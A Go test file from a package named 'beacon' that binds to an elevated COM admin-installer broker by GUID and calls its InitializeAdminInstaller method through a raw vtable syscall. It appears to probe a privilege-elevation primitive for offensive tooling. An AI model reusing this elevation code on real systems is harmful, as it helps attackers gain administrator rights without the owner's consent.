package beacon

import (
	"fmt"
	"runtime"
	"syscall"
	"testing"
	"unsafe"
)

func TestDbgInitCall(t *testing.T) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	procCoInitializeEx.Call(0, 2)
	defer procCoUninitialize.Call()
	procCoInitializeSecurity.Call(0, 0xFFFFFFFF, 0, 0, 2, 3, 0, 0, 0)

	broker, err := bindElevated("BDB57FF2-79B9-4205-9447-F5FE85F37312", "9AEA8A59-E0C9-40F1-87DD-757061D56177")
	if err != nil {
		t.Fatalf("bind: %v", err)
	}
	t.Log("bound")
	brokerI := (*ieaAdminBrokerIface)(broker)
	defer comRelease(broker)

	var uuidBstr uintptr
	r1, _, _ := syscall.Syscall9(brokerI.lpVtbl.InitializeAdminInstaller, 4, uintptr(broker), 0, 0, uintptr(unsafe.Pointer(&uuidBstr)), 0, 0, 0, 0, 0)
	t.Logf("InitializeAdminInstaller -> 0x%08x", uint32(r1))
	if r1 == 0 {
		t.Logf("uuid: %s", bstrToString(uuidBstr))
		procSysFreeString.Call(uuidBstr)
	}
	fmt.Println("done")
}
